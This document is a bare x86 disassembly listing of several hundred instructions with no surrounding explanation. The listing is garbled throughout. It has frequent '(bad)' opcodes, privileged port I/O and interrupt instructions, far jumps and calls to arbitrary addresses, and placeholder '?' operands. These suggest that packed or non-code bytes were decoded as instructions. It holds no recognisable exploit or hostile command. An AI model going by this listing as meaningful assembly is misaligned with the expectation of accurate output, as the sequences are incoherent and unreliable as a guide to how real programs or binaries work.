  4133e3:	mov    DWORD PTR [edi+0x6f],esi
  4133e6:	mov    ds:0x7d296cf,al
  4133eb:	gs sbb al,0xd9
  4133ee:	repz jmp 0x4133e3
  4133f1:	out    dx,eax
  4133f2:	cdq    
  4133f3:	idiv   BYTE PTR ds:0xf30185c9
  4133f9:	out    0xfe,eax
  4133fb:	rcr    DWORD PTR [esi+0x3c6d1031],0x6f
  413402:	repnz add al,0x50
  413405:	dec    edi
  413406:	cmp    ah,BYTE PTR [ebp-0x7c]
  413409:	mov    ebx,0xfbd0b40d
  41340e:	jnp    0x413459
  413410:	xchg   edx,eax
  413411:	lds    eax,FWORD PTR [eax+0x3e63b058]
  413417:	xchg   ebp,eax
  413418:	xlat   BYTE PTR ds:[ebx]
  413419:	jl     0x4133e1
  41341b:	xchg   edx,eax
  41341c:	and    eax,eax
  41341e:	jno    0x4133be
  413420:	lahf   
  413421:	or     DWORD PTR [eax+0x2c],ebp
  413424:	sub    ah,BYTE PTR [edx-0x677f6309]
  41342a:	int    0x1f
  41342c:	cmp    ch,ch
  41342e:	cs pop ss
  413430:	or     BYTE PTR [edx-0x40],0x8
  413434:	popf   
  413435:	je     0x4133fe
  413437:	mov    al,0xd1
  413439:	in     eax,dx
  41343a:	cmp    eax,0x58ee95f7
  41343f:	mov    dl,0x10
  413441:	data16 je 0x4133e4
  413444:	cli    
  413445:	mov    ch,0xd9
  413447:	adc    bl,bl
  413449:	xor    esp,DWORD PTR [eax+0x14]
  41344c:	sub    DWORD PTR [ebx+eax*4],ebp
  41344f:	inc    esi
  413450:	lea    ebx,[ebx]
  413452:	imul   edi,DWORD PTR [edx+ebx*4+0x355910d6],0x47224fd8
  41345d:	inc    ebx
  41345e:	mov    ebx,0xe6f849fe
  413463:	push   ss
  413464:	sbb    BYTE PTR ds:0x6a76995c,ah
  41346a:	je     0x413490
  41346c:	(bad)  
  41346d:	aaa    
  41346e:	int    0x7c
  413470:	or     BYTE PTR [ebp-0x26],cl
  413473:	adc    DWORD PTR [edi-0x21],0x35
  413477:	mov    dh,0x61
  413479:	scas   eax,DWORD PTR es:[edi]
  41347a:	call   DWORD PTR [ebx-0x3c]
  41347d:	stc    
  41347e:	sti    
  41347f:	add    eax,0xe3edb2fc
  413484:	iret   
  413485:	dec    ecx
  413486:	cmp    BYTE PTR [esi-0x67119327],ch
  41348c:	neg    DWORD PTR [eax-0x6b]
  41348f:	mov    dh,0x1a
  413491:	and    ebx,esi
  413493:	push   edi
  413494:	aam    0x9a
  413496:	jecxz  0x413474
  413498:	into   
  413499:	popa   
  41349a:	adc    BYTE PTR [edi+0x52e89749],bl
  4134a0:	aaa    
  4134a1:	clc    
  4134a2:	stc    
  4134a3:	mov    ds:0x32ee6abd,eax
  4134a8:	xchg   edx,eax
  4134a9:	mov    dl,0xec
  4134ab:	stc    
  4134ac:	dec    esp
  4134ad:	in     al,0xe2
  4134af:	call   0x4906d8e0
  4134b4:	pop    ebx
  4134b5:	je     0x413482
  4134b7:	rol    BYTE PTR [ebx-0x43],1
  4134ba:	jmp    0x657c3143
  4134bf:	cld    
  4134c0:	mov    ebp,0x440301fc
  4134c5:	enter  0x458c,0xa9
  4134c9:	push   ebx
  4134ca:	test   eax,0xf6d9ee73
  4134cf:	jecxz  0x413495
  4134d1:	loope  0x4134be
  4134d3:	cmp    bl,dl
  4134d5:	fcom   DWORD PTR [ecx]
  4134d7:	pop    eax
  4134d8:	add    al,0x28
  4134da:	in     al,dx
  4134db:	jmp    0x2c30d4d7
  4134e0:	fcom   DWORD PTR [edi-0x35e8e925]
  4134e6:	inc    ebp
  4134e7:	mov    bh,0xd
  4134e9:	push   ds
  4134ea:	repnz inc eax
  4134ec:	jbe    0x4134a9
  4134ee:	rcr    DWORD PTR [ecx],cl
  4134f0:	pop    ebx
  4134f1:	popa   
  4134f2:	and    bl,BYTE PTR [ebx+ebx*2]
  4134f5:	fistp  WORD PTR [esp+ebp*4-0xa841b39]
  4134fc:	mov    ch,0xb3
  4134fe:	xchg   esi,eax
  4134ff:	mov    WORD PTR [ecx+esi*8-0x61],gs
  413503:	std    
  413504:	pop    esp
  413505:	xor    cl,0xe9
  413508:	jno    0x413579
  41350a:	dec    eax
  41350b:	mov    edi,0xf2e4aa55
  413510:	jge    0x4134c1
  413512:	inc    esi
  413513:	test   al,0xe4
  413515:	sti    
  413516:	jmp    0x4134e8
  413518:	jb     0x413575
  41351a:	xlat   BYTE PTR ds:[ebx]
  41351b:	das    
  41351c:	out    0x13,al
  41351e:	xchg   edx,eax
  41351f:	dec    edi
  413520:	push   ss
  413521:	sbb    BYTE PTR [ebx],bl
  413523:	test   BYTE PTR [edi],0xc
  413526:	sub    al,0x57
  413528:	sbb    BYTE PTR [esi+0x27],cl
  41352b:	out    dx,al
  41352c:	mov    bh,cl
  41352e:	mov    cl,0xc8
  413530:	bound  esp,QWORD PTR [ebx+0x20564d48]
  413536:	es inc edi
  413538:	(bad)  
  413539:	call   ecx
  41353b:	jg     0x4134da
  41353d:	cmc    
  41353e:	jp     0x413510
  413540:	jge    0x41353a
  413542:	jg     0x41353e
  413544:	cmp    dh,BYTE PTR [ebx+esi*8+0xe]
  413548:	mov    esi,esi
  41354a:	add    BYTE PTR [eax+0x5e97ea7a],dh
  413550:	cmp    al,0xb1
  413552:	out    dx,eax
  413553:	mov    edi,0x2f273005
  413558:	cmp    esp,DWORD PTR [eax+0x4]
  41355b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41355d:	cli    
  41355e:	mov    edi,?
  413560:	adc    al,0x2c
  413562:	adc    eax,0x1bee283e
  413567:	xchg   edx,eax
  413568:	test   DWORD PTR [ebp+0x2d],edi
  41356b:	ins    BYTE PTR es:[edi],dx
  41356c:	xor    eax,0x1ed90403
  413571:	xlat   BYTE PTR ds:[ebx]
  413572:	cld    
  413573:	push   esp
  413574:	mov    BYTE PTR [ebx-0x61],al
  413577:	std    
  413578:	js     0x413558
  41357a:	inc    esp
  41357b:	cmp    ch,bl
  41357d:	mov    edi,0x8913c77c
  413582:	mov    ebp,0x841ac0df
  413587:	sub    al,0x8f
  413589:	sub    ecx,eax
  41358b:	loop   0x4135b8
  41358d:	jmp    0x41353d
  41358f:	mov    bh,0x71
  413591:	out    dx,eax
  413592:	jmp    0xa32b:0xec13a2e
  413599:	xor    eax,esi
  41359b:	xchg   edx,eax
  41359c:	cs and al,0x79
  41359f:	loop   0x4135aa
  4135a1:	mov    bl,0xc
  4135a3:	pop    eax
  4135a4:	push   esi
  4135a5:	sti    
  4135a6:	sub    edx,DWORD PTR [edi]
  4135a8:	repz ds enterw 0xbb8a,0x7e
  4135af:	sbb    DWORD PTR [edx],edx
  4135b1:	mov    ebp,0x45208264
  4135b6:	mov    ecx,0x47b2711
  4135bb:	outs   dx,BYTE PTR ds:[esi]
  4135bc:	lds    esi,FWORD PTR [ebx+esi*1-0x13]
  4135c0:	in     al,dx
  4135c1:	dec    esp
  4135c2:	xor    BYTE PTR [eax],al
  4135c4:	(bad)  
  4135c5:	aaa    
  4135c6:	js     0x413642
  4135c8:	jb     0x413612
  4135ca:	push   esi
  4135cb:	adc    dl,0xd7
  4135ce:	js     0x41356d
  4135d0:	mov    cs,WORD PTR [ecx+0x5355e3be]
  4135d6:	aad    0x41
  4135d8:	push   ss
  4135d9:	(bad)  
  4135da:	jnp    0x4135cb
  4135dc:	cs je  0x4135de
  4135df:	icebp  
  4135e0:	test   DWORD PTR [edi],edx
  4135e2:	lahf   
  4135e3:	call   0x5960:0x409753ce
  4135ea:	enter  0x849d,0x43
  4135ee:	bound  edi,QWORD PTR [ecx+eiz*4+0x5d51afd1]
  4135f5:	xor    BYTE PTR [eax+ebp*4-0x5b307fee],ah
  4135fc:	pop    esi
  4135fd:	jns    0x41362f
  4135ff:	(bad)  
  413600:	mov    al,ds:0xec7eebba
  413605:	into   
  413606:	sar    BYTE PTR [ecx-0x1abd635b],1
  41360c:	mov    eax,ds:0x6b9e37b3
  413611:	mov    fs,ebp
  413613:	pop    DWORD PTR [edx-0x62c02524]
  413619:	or     edx,DWORD PTR [esi]
  41361b:	popa   
  41361c:	pop    esp
  41361d:	lea    ebx,[edi+0x4]
  413620:	add    BYTE PTR [esi-0x89f538],bh
  413626:	(bad)
  413629:	aad    0x2d
  41362b:	mov    ds:0x991dc633,eax
  413630:	jge    0x4135b7
  413632:	jge    0x4135b4
  413634:	xchg   esp,eax
  413635:	mul    BYTE PTR [eax-0x5fd30277]
  41363b:	fwait
  41363c:	or     dh,BYTE PTR [eax]
  41363e:	pop    edi
  41363f:	xchg   BYTE PTR [ecx],dh
  413641:	(bad)  
  413642:	rol    DWORD PTR [eax-0xa],cl
  413645:	xchg   DWORD PTR [eax+0xf],esi
  413648:	push   edx
  413649:	sub    al,0xf6
  41364b:	pop    esi
  41364c:	stc    
  41364d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41364e:	pushf  
  41364f:	xlat   BYTE PTR ds:[ebx]
  413650:	dec    esp
  413651:	pusha  
  413652:	xor    al,0xf2
  413654:	cwde   
  413655:	fstp   QWORD PTR [ebp+0x6b0e64f1]
  41365b:	int3   
  41365c:	je     0x41364a
  41365e:	push   ebx
  41365f:	adc    eax,0xb594667f
  413664:	les    edi,FWORD PTR [edi+0x3ee7305e]
  41366a:	retf   
  41366b:	xchg   esi,eax
  41366c:	mov    dl,0xb8
  41366e:	out    0xd0,eax
  413670:	push   0xffffff81
  413672:	or     al,BYTE PTR [edx+0x198c7249]
  413678:	ins    BYTE PTR es:[edi],dx
  413679:	hlt    
  41367a:	(bad)  
  41367b:	das    
  41367c:	iret   
  41367d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41367e:	loop   0x413680
  413680:	lds    edx,FWORD PTR [ebp+0x1fc9d31e]
  413686:	xchg   eax,ebx
  413688:	adc    DWORD PTR [edi-0x54da4927],0xe6163100
  413692:	mov    ch,0x6e
  413694:	out    dx,eax
  413695:	jns    0x413690
  413697:	mov    esi,0x59485e85
  41369c:	mov    ds:0x7ef1287e,al
  4136a1:	inc    ecx
  4136a2:	mov    bl,0xba
  4136a4:	aad    0x38
  4136a6:	xchg   ebp,eax
  4136a7:	jmp    0x25b4527c
  4136ac:	sub    eax,DWORD PTR [eax]
  4136ae:	xchg   edi,eax
  4136af:	xor    al,0x45
  4136b1:	sahf   
  4136b2:	xchg   esp,eax
  4136b3:	cli    
  4136b4:	xchg   ebp,eax
  4136b5:	sbb    al,0xe7
  4136b7:	in     eax,dx
  4136b8:	or     eax,eax
  4136ba:	retf   
  4136bb:	sbb    eax,0xeff84bfe
  4136c0:	jl     0x4136f3
  4136c2:	jbe    0x41366d
  4136c4:	jge    0x4136cb
  4136c6:	cdq    
  4136c7:	inc    ebx
  4136c8:	push   ebx
  4136c9:	(bad)  
  4136ca:	clc    
  4136cb:	jb     0x413711
  4136cd:	mov    ebp,0xeb72cfcc
  4136d2:	mov    cs,WORD PTR [esi+0x2d7fd7ff]
  4136d8:	stos   DWORD PTR es:[edi],eax
  4136d9:	jne    0x4136d2
  4136db:	adc    esi,DWORD PTR ds:[ebx+0x7f74b937]
  4136e2:	sub    dh,BYTE PTR ds:0x83b71e0c
  4136e8:	dec    eax
  4136e9:	dec    ebx
  4136ea:	cld    
  4136eb:	arpl   WORD PTR [edi-0x14],sp
  4136ee:	mov    ebp,0x75226f94
  4136f3:	xor    al,0x0
  4136f5:	je     0x413742
  4136f7:	pop    eax
  4136f8:	inc    eax
  4136f9:	mov    ecx,0xf73fa79d
  4136fe:	test   eax,0x1e351c2e
  413703:	sbb    BYTE PTR [ebx-0x7b],ah
  413706:	in     eax,0xd1
  413708:	gs jae 0x4136f5
  41370b:	dec    ebp
  41370c:	jne    0x4136c5
  41370e:	sbb    edi,DWORD PTR [ecx-0xd]
  413711:	mov    cl,0xab
  413713:	ins    DWORD PTR es:[edi],dx
  413714:	outs   dx,BYTE PTR ds:[esi]
  413715:	mov    esp,0x60566262
  41371a:	push   eax
  41371b:	dec    edx
  41371c:	aas    
  41371d:	mov    ah,BYTE PTR [esi+0x59]
  413720:	(bad)  
  413721:	cmp    BYTE PTR [esi+0x5e239dc3],bh
  413727:	(bad)  
  413728:	cmp    al,0xba
  41372a:	test   al,0x66
  41372d:	scas   al,BYTE PTR es:[edi]
  41372e:	lods   al,BYTE PTR ds:[esi]
  41372f:	ror    BYTE PTR [esi-0x48a48143],cl
  413735:	mov    ah,0x66
  413737:	mov    ebx,0xcfce0e87
  41373c:	mov    ecx,0x20a20c21
  413741:	stos   DWORD PTR es:[edi],eax
  413742:	lods   al,BYTE PTR ds:[esi]
  413743:	dec    ebx
  413744:	cli    
  413745:	jmp    0xb67d97d
  41374a:	loop   0x413717
  41374c:	mov    eax,0x305ee91e
  413751:	loope  0x413705
  413753:	mov    dh,0x85
  413755:	in     eax,0xbf
  413757:	xchg   ebx,eax
  413758:	ins    DWORD PTR es:[edi],dx
  413759:	jbe    0x41375c
  41375b:	nop
  41375c:	pop    ebp
  41375d:	mov    ah,0xe4
  41375f:	ss jmp 0x413781
  413762:	inc    esi
  413763:	cmp    eax,0x156d1479
  413768:	push   esi
  413769:	aam    0x32
  41376b:	adc    DWORD PTR [edx+0x71],0xffffffe9
  41376f:	(bad)  
  413770:	cmp    DWORD PTR [edi-0x5f],ebx
  413773:	push   ds
  413774:	out    dx,al
  413775:	adc    DWORD PTR [edi-0x75eb8a5c],ebx
  41377b:	mov    ebp,0xf930029f
  413780:	out    dx,eax
  413781:	cmp    esi,0x63
  413784:	pop    ss
  413785:	xchg   esi,eax
  413786:	mov    ds,WORD PTR [esp+eax*2+0xd4d7d5c]
  41378d:	(bad)  
  41378f:	les    ebp,FWORD PTR [ebx]
  413791:	adc    bh,al
  413793:	imul   ecx,DWORD PTR [eax-0x6e],0xbf4b8e02
  41379a:	data16 and al,0xa9
  41379d:	mov    ch,0xa4
  41379f:	jb     0x413759
  4137a1:	rol    DWORD PTR [esi-0x22577d6d],1
  4137a7:	std    
  4137a8:	sbb    al,dh
  4137aa:	out    dx,eax
  4137ab:	cld    
  4137ac:	addr16 xchg ecx,eax
  4137ae:	(bad)  
  4137b0:	add    DWORD PTR [edi+ebp*2-0xf],ecx
  4137b4:	and    eax,0x6dc57f0e
  4137b9:	jno    0x4137e2
  4137bb:	and    ch,dl
  4137bd:	sub    eax,0x41bcccb5
  4137c2:	inc    eax
  4137c3:	or     eax,DWORD PTR [ebp+0x1e]
  4137c6:	cmp    ebx,esp
  4137c8:	aaa    
  4137c9:	pop    ebx
  4137ca:	enter  0xecca,0x55
  4137ce:	mov    ebx,0xf39f6d91
  4137d3:	mov    ecx,0xf3989fd9
  4137d8:	add    al,0xe7
  4137da:	adc    BYTE PTR [ebp+0x11],ch
  4137dd:	(bad)  [edi+esi*4+0x42]
  4137e1:	cmp    DWORD PTR [eax+edx*8],esp
  4137e4:	cld    
  4137e5:	adc    esp,DWORD PTR [edx-0x65]
  4137e8:	push   0x29
  4137ea:	call   0x9b1a60d4
  4137ef:	popf   
  4137f0:	xchg   edi,eax
  4137f1:	sub    ebx,esi
  4137f3:	mov    edx,0x45d71974
  4137f8:	sub    ebp,DWORD PTR [esi+0x40]
  4137fb:	adc    al,0xa1
  4137fd:	push   ebx
  4137fe:	into   
  4137ff:	push   ds
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	cmp    al,0x90
  413803:	or     BYTE PTR [edx],bh
  413805:	add    eax,0x106a8afd
  41380a:	daa    
  41380b:	arpl   WORD PTR [esi+0x3e6f9bbf],di
  413811:	add    BYTE PTR [esi],ch
  413813:	jp     0x413817
  413815:	call   0x4987f31b
  41381a:	and    DWORD PTR [ebx],edi
  41381c:	bound  ebx,QWORD PTR [edx-0x72]
  41381f:	fidiv  WORD PTR es:[edx]
  413822:	es xchg esp,eax
  413824:	mov    eax,0x1c894964
  413829:	cld    
  41382a:	jecxz  0x413814
  41382c:	mov    ch,0x5c
  41382e:	repnz dec eax
  413830:	xchg   ebp,eax
  413831:	jle    0x413884
  413833:	mov    ds:0xb6cb10ff,eax
  413838:	sbb    ecx,edi
  41383a:	sub    al,0xbc
  41383c:	shr    DWORD PTR [ebx-0x316d74e3],0xf
  413843:	iret   
  413844:	mov    DWORD PTR [eax+eiz*1],0x4d51d61e
  41384b:	out    dx,eax
  41384c:	sub    esi,DWORD PTR [ebx]
  41384e:	jae    0x413873
  413850:	xchg   ebp,eax
  413851:	xor    eax,0x46733283
  413856:	not    ch
  413858:	xor    DWORD PTR [eax],0x47
  41385b:	push   ss
  41385c:	scas   eax,DWORD PTR es:[edi]
  41385d:	sub    cl,al
  41385f:	pop    eax
  413860:	mov    eax,ds:0xb2850c96
  413865:	popf   
  413866:	xchg   ecx,eax
  413867:	into   
  413868:	xchg   esi,eax
  413869:	loop   0x413873
  41386b:	nop
  41386c:	rol    ch,cl
  41386e:	out    0x3f,eax
  413870:	int3   
  413871:	(bad)  
  413872:	aam    0x62
  413874:	and    al,0x99
  413876:	stos   BYTE PTR es:[edi],al
  413877:	(bad)  
  413878:	mov    bl,0xd6
  41387a:	dec    esi
  41387b:	cmp    eax,esp
  41387d:	scas   al,BYTE PTR es:[edi]
  41387e:	mov    dh,0x85
  413880:	mov    cl,0xa4
  413882:	pop    ss
  413883:	imul   ebp,DWORD PTR [ebx-0x2d],0xf6eaba69
  41388a:	in     al,dx
  41388b:	rcr    DWORD PTR [edx],1
  41388d:	jbe    0x4138e9
  41388f:	in     eax,dx
  413890:	retf   
  413891:	adc    dh,al
  413893:	push   edx
  413894:	push   ss
  413895:	inc    ebx
  413896:	pop    eax
  413897:	dec    ebp
  413898:	sub    eax,0x6be49a4a
  41389d:	sbb    ebp,DWORD PTR [eax]
  41389f:	leave  
  4138a0:	and    ch,bh
  4138a2:	pusha  
  4138a3:	sbb    DWORD PTR [edi],0x32
  4138a6:	push   esi
  4138a7:	gs add al,0x25
  4138aa:	jecxz  0x4138ab
  4138ac:	mov    edx,0x652290ac
  4138b1:	push   ebp
  4138b2:	(bad)  
  4138b3:	jbe    0x41389a
  4138b5:	sbb    ebx,DWORD PTR [ebp-0x7c32be85]
  4138bb:	pop    esi
  4138bc:	dec    edi
  4138bd:	ret    0xca6f
  4138c0:	loopne 0x41385a
  4138c2:	iret   
  4138c3:	pushw  es
  4138c5:	imul   edi
  4138c7:	sub    BYTE PTR [edx+ecx*4-0x7a],bl
  4138cb:	cwde   
  4138cc:	or     eax,esp
  4138ce:	(bad)  
  4138cf:	aas    
  4138d0:	dec    edx
  4138d1:	jecxz  0x4138e3
  4138d3:	jg     0x4138c1
  4138d5:	sahf   
  4138d6:	xchg   ebx,eax
  4138d7:	pop    ecx
  4138d8:	out    dx,eax
  4138d9:	mov    esi,ebp
  4138db:	adc    bh,BYTE PTR [edx+0x55]
  4138de:	je     0x413928
  4138e0:	js     0x413940
  4138e2:	test   eax,0xb148d09e
  4138e7:	xchg   ebp,eax
  4138e8:	test   DWORD PTR [esi+eax*4-0x20],edi
  4138ec:	or     edi,DWORD PTR [esi+0xc]
  4138ef:	push   edi
  4138f0:	fisub  DWORD PTR [ebp-0x3c84095d]
  4138f6:	adc    al,0x9e
  4138f8:	add    edx,eax
  4138fa:	enter  0xc0b8,0xed
  4138fe:	(bad)  [edi]
  413900:	jmp    0x37d2a7a7
  413905:	mov    edi,0x6a07d5e9
  41390a:	sbb    eax,0x7c8cf86c
  41390f:	cmp    ah,bh
  413911:	loope  0x4138a9
  413913:	push   0x9ee0101d
  413918:	push   eax
  413919:	fimul  DWORD PTR [ecx]
  41391b:	xchg   ebp,eax
  41391c:	out    0x6a,eax
  41391e:	sub    DWORD PTR [ebx],esp
  413920:	inc    eax
  413921:	mov    ebp,0xfbc1b7bb
  413926:	inc    ebx
  413927:	stos   DWORD PTR es:[edi],eax
  413928:	jno    0x41393f
  41392a:	ror    ah,0xb6
  41392d:	lahf   
  41392e:	fstp   QWORD PTR [edi+0x12fb8ab3]
  413934:	test   BYTE PTR [edi+ebp*1+0x12],ah
  413938:	repz mov al,0x24
  41393b:	call   0xab4:0x2f2ff014
  413942:	out    dx,eax
  413943:	dec    edi
  413944:	adc    al,0x50
  413946:	or     edx,DWORD PTR [eax+0x384bc099]
  41394c:	daa    
  41394d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41394e:	sbb    DWORD PTR [eax+0x6764b460],edi
  413954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413955:	mov    edx,0x53967a83
  41395a:	aam    0x49
  41395c:	inc    esi
  41395d:	and    BYTE PTR [ecx+0xa],ch
  413960:	in     al,0xb3
  413962:	sar    BYTE PTR [eax],1
  413964:	push   edx
  413965:	and    bl,BYTE PTR [eax]
  413967:	pop    esp
  413968:	push   ss
  413969:	pop    ss
  41396a:	mov    ebp,0x7411e259
  41396f:	daa    
  413970:	in     eax,0x3a
  413972:	addr16 pop ds
  413974:	mov    DWORD PTR [ecx],esi
  413976:	bound  edi,QWORD PTR [ecx-0x6e62f745]
  41397c:	jne    0x4139f0
  41397e:	sub    al,ch
  413980:	popf   
  413981:	dec    edx
  413982:	mov    BYTE PTR [edi],bh
  413984:	pusha  
  413985:	out    dx,al
  413986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413987:	fsub   QWORD PTR [esi]
  413989:	popf   
  41398a:	clc    
  41398b:	out    dx,eax
  41398c:	(bad)  
  41398e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41398f:	adc    DWORD PTR fs:[ecx+0x2d],edi
  413993:	lock cmp al,BYTE PTR [ebx-0x6c4da87f]
  41399a:	mov    al,0x38
  41399c:	or     dh,BYTE PTR [esi]
  41399e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41399f:	xchg   esp,eax
  4139a0:	aad    0x9c
  4139a2:	xchg   edx,eax
  4139a3:	lds    ecx,FWORD PTR [edx-0x6b83e59e]
  4139a9:	ror    DWORD PTR [ecx+0x55],cl
  4139ac:	mov    dh,bl
  4139ae:	pop    edx
  4139af:	and    eax,0x4e0ec46d
  4139b4:	xor    esi,DWORD PTR [ebx+eax*4-0x2b39dc74]
  4139bb:	push   0x35
  4139bd:	mov    ecx,0x1ca03c01
  4139c2:	ins    DWORD PTR es:[edi],dx
  4139c3:	jge    0x413966
  4139c5:	mov    dl,0x51
  4139c7:	add    eax,0xa8e53f4b
  4139cc:	nop
  4139cd:	mov    al,ds:0x19fbb703
  4139d2:	fs fs pop esp
  4139d5:	cmp    bh,BYTE PTR [eax]
  4139d7:	pusha  
  4139d8:	int    0x37
  4139da:	xor    eax,0x8fd33de4
  4139df:	push   ds
  4139e0:	inc    ecx
  4139e1:	xchg   ecx,eax
  4139e2:	shr    BYTE PTR [ebx-0x4a],0x99
  4139e6:	adc    BYTE PTR [ecx+ebx*1-0x8],al
  4139ea:	adc    BYTE PTR [ecx+0x3d],ch
  4139ed:	in     al,0xc
  4139ef:	pushf  
  4139f0:	xor    esp,DWORD PTR [eax-0x2f9cd1d7]
  4139f6:	push   0x162d39c3
  4139fb:	push   edi
  4139fc:	push   ecx
  4139fd:	imul   edi,esi,0xffffffac
  413a00:	dec    edx
  413a01:	imul   edx,ecx,0x406bc059
  413a07:	loopne 0x413a76
  413a09:	mov    dh,0x7a
  413a0b:	xchg   cl,bh
  413a0d:	stc    
  413a0e:	in     al,dx
  413a0f:	sbb    dl,0x1b
  413a12:	jge    0x413995
  413a14:	(bad)  
  413a15:	in     eax,dx
  413a16:	lea    edx,[edi]
  413a18:	popf   
  413a19:	cs enter 0xc978,0xab
  413a1e:	out    dx,al
  413a1f:	mov    dh,0x16
  413a21:	sahf   
  413a22:	stos   BYTE PTR es:[edi],al
  413a23:	fdiv   QWORD PTR [ebp-0x5]
  413a26:	sti    
  413a27:	jmp    0x6eb57e92
  413a2c:	loope  0x413a71
  413a2e:	arpl   WORD PTR ds:[ebx],dx
  413a31:	and    al,0x66
  413a33:	fild   QWORD PTR [edi+0x7fa1f54d]
  413a39:	outs   dx,BYTE PTR ds:[esi]
  413a3a:	mov    cl,0xe9
  413a3c:	inc    edi
  413a3d:	cli    
  413a3e:	push   edi
  413a3f:	inc    edi
  413a40:	pop    esi
  413a41:	mov    WORD PTR [esi+0x79e99259],?
  413a47:	adc    DWORD PTR [eax-0x28],ecx
  413a4a:	sbb    bl,dl
  413a4c:	jmp    0xa8019b1f
  413a51:	jge    0x413a88
  413a53:	arpl   WORD PTR [eax-0x7febaa86],bp
  413a59:	ja     0x413aa4
  413a5b:	(bad)  
  413a5c:	xlat   BYTE PTR ds:[ebx]
  413a5d:	xor    dl,BYTE PTR [eax]
  413a5f:	or     BYTE PTR [eax],al
  413a61:	ror    BYTE PTR [ebx+ecx*1+0x60],1
  413a65:	imul   ecx,DWORD PTR [ebx-0x2d],0xa23b5e9c
  413a6c:	rol    ah,1
  413a6e:	xchg   esi,eax
  413a6f:	and    bl,BYTE PTR [ecx+eiz*1-0x28]
  413a73:	pop    esp
  413a74:	nop
  413a75:	sub    esp,ebp
  413a77:	sbb    al,0x9d
  413a79:	push   DWORD PTR [ebx+0x3]
  413a7c:	add    esp,DWORD PTR [esi]
  413a7e:	out    dx,eax
  413a7f:	test   dl,0x92
  413a82:	enter  0x14ab,0x50
  413a86:	dec    ebp
  413a87:	(bad)
  413a8b:	sbb    ch,ch
  413a8d:	jge    0x413ab0
  413a8f:	imul   esi
  413a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a92:	jmp    0x413b05
  413a94:	adc    eax,0xf4107049
  413a99:	xor    al,0xe
  413a9b:	ss mov bh,0x5a
  413a9e:	(bad)  
  413a9f:	outs   dx,BYTE PTR es:[esi]
  413aa1:	xor    esi,ebx
  413aa3:	cmp    al,0x30
  413aa5:	sbb    al,0x45
  413aa7:	adc    BYTE PTR [esi-0x14],dh
  413aaa:	dec    ebx
  413aab:	sbb    eax,DWORD PTR [ebp+ebp*2-0x7325b25e]
  413ab2:	ret    
  413ab3:	adc    edx,ebp
  413ab5:	mov    esp,esi
  413ab7:	lock inc edx
  413ab9:	push   ebp
  413aba:	inc    ebp
  413abb:	mov    ?,ebx
  413abd:	xor    BYTE PTR [eax-0x227297b1],0x9d
  413ac4:	(bad)  
  413ac5:	call   0xd512:0xa54b5960
  413acc:	(bad)  
  413acd:	test   al,0x17
  413acf:	add    eax,0x2e1d8562
  413ad4:	retf   0x6848
  413ad7:	xor    DWORD PTR [ebp-0x32],0x74
  413adb:	imul   ebp,DWORD PTR [esi],0x7a
  413ade:	xchg   ebp,eax
  413adf:	inc    esi
  413ae0:	bound  ebp,QWORD PTR [esi+0x583ee595]
  413ae6:	dec    esp
  413ae7:	dec    esi
  413ae8:	sti    
  413ae9:	mov    al,0x67
  413aeb:	lods   eax,DWORD PTR ds:[esi]
  413aec:	jg     0x413a85
  413aee:	adc    al,0x99
  413af0:	pop    edx
  413af1:	dec    eax
  413af2:	jg     0x413aa8
  413af4:	push   ss
  413af5:	mov    ebp,0x967d318d
  413afa:	sub    DWORD PTR [edi+0x7d],0x17d63b7
  413b01:	push   cs
  413b02:	pop    esp
  413b03:	ds inc eax
  413b05:	(bad)  
  413b06:	jmp    0x413ac1
  413b08:	mov    ch,0x27
  413b0a:	xchg   edx,eax
  413b0b:	stos   DWORD PTR es:[edi],eax
  413b0c:	outs   dx,BYTE PTR ds:[esi]
  413b0d:	gs hlt 
  413b0f:	pop    edx
  413b10:	lea    ebp,[esi+0x9]
  413b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b14:	test   DWORD PTR [ecx-0xf],esp
  413b17:	pusha  
  413b18:	jb     0x413add
  413b1a:	loopne 0x413b39
  413b1c:	jnp    0x413ad9
  413b1e:	push   ecx
  413b1f:	mov    dh,0x0
  413b21:	xor    ch,bl
  413b23:	push   eax
  413b24:	aaa    
  413b25:	xor    al,0x65
  413b27:	and    eax,0x782827eb
  413b2c:	test   eax,0xd166bf0f
  413b31:	xchg   edi,eax
  413b32:	jae    0x413aee
  413b34:	sti    
  413b35:	inc    esp
  413b36:	sbb    al,0xd7
  413b38:	xlat   BYTE PTR ds:[ebx]
  413b39:	shl    BYTE PTR [eax+0xe14edfd],1
  413b3f:	enter  0xdc41,0xa
  413b43:	push   edx
  413b44:	jb     0x413acf
  413b46:	popf   
  413b47:	fiadd  WORD PTR [ecx]
  413b49:	jno    0x413b28
  413b4b:	mov    bl,0x28
  413b4d:	ins    BYTE PTR es:[edi],dx
  413b4e:	sub    DWORD PTR [edx+0x15119dfd],ecx
  413b54:	cmp    esi,DWORD PTR [eax+ebp*1+0x379d42ed]
  413b5b:	and    eax,0x49c6493a
  413b60:	xor    BYTE PTR ds:0xdf72b499,0x41
  413b67:	ins    DWORD PTR es:[edi],dx
  413b68:	in     eax,0x4f
  413b6a:	repz xor eax,0xc3d332fc
  413b70:	push   edi
  413b71:	test   DWORD PTR [esi+edi*8],ecx
  413b74:	sbb    BYTE PTR [ecx+0x2e],0x8c
  413b78:	packsswb mm5,QWORD PTR [edi-0x5d]
  413b7c:	aas    
  413b7d:	xchg   esp,eax
  413b7e:	jbe    0x413b80
  413b80:	jb     0x413b15
  413b82:	in     eax,dx
  413b83:	ins    DWORD PTR es:[edi],dx
  413b84:	cmp    al,0xd2
  413b86:	pop    esi
  413b87:	push   esp
  413b88:	(bad)  
  413b89:	mov    WORD PTR [ebp+0x3359a961],ss
  413b8f:	mov    BYTE PTR [ecx+0x4c],ah
  413b92:	aas    
  413b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b94:	fimul  DWORD PTR [esi-0x43ef9989]
  413b9a:	sbb    BYTE PTR [eax+eax*2],ah
